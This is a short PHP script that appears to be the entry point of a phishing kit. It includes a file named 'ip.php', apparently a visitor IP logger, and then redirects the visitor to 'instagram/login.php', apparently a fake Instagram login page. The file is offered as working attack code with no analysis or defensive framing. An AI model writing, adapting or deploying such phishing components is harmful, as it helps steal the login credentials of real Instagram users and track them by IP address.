<?php
include'ip.php';
header('Location: instagram/login.php');
exit();
?>
